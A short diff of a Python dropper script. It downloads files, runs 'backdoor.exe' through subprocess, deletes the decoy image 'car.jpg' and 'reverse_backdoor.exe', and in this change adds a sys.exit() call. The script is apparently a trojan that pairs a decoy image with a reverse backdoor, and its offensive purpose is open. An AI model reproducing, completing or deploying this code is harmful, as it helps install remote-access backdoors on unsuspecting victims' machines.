@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import subprocess, requests, os, tempfile
+import subprocess, requests, os, tempfile, sys
 
 def download(url):
     get_response = requests.get(url)
@@ -25,3 +25,4 @@ subprocess.call("backdoor.exe", shell=True)
 os.remove("car.jpg")
 os.remove("reverse_backdoor.exe")
 
+sys.exit()
